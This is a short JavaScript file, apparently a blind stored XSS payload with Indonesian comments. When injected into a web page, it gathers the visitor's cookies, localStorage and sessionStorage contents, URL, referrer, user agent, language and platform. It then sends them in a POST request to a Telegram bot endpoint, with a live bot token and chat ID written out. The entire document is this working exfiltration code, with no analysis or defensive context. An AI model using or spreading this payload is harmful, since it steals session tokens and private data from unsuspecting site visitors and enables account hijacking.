(async () => {
      const cookies = document.cookie || "Tidak ada cookie";
      const url = window.location.href;
      const userAgent = navigator.userAgent;
      const referrer = document.referrer || "Tidak ada referrer";
      const localStorageData = JSON.stringify(localStorage) || "Kosong";
      const sessionStorageData = JSON.stringify(sessionStorage) || "Kosong";
      const language = navigator.language;
      const platform = navigator.platform;

  // Gabungkan semua data
  let message = `
  🚨 Blind Stored XSS Executed
  📍 URL: ${url}
  🍪 Cookies: ${cookies}
  📱 User-Agent: ${userAgent}
  ↩️ Referrer: ${referrer}
  🗄️ localStorage: ${localStorageData}
  📦 sessionStorage: ${sessionStorageData}
  🌐 Language: ${language}
  💻 Platform: ${platform}
  `;

  // Potong pesan jika lebih dari 4000 karakter
  if (message.length > 4000) {
    message = message.slice(0, 4000) + "\n\n(Potongan karena melebihi batas)";
}

await fetch("https://api.telegram.org/bot6592357228:AAGNYLCsNW2prmow3QvY9ieeHG-stoTJ55I/sendMessage", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
  },
  body: JSON.stringify({
      chat_id: "-1002002449257",
      text: message
  })
});
})();
